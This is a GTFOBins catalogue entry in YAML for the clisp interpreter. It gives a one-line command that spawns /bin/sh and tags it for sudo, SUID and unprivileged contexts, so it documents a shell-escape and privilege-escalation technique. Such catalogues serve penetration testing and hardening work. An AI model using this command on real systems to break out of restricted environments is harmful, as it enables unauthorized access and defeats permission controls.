<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/clisp -->
---
functions:
  shell:
  - code: |-
      clisp -x '(ext:run-shell-command "/bin/sh")(ext:exit)'
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
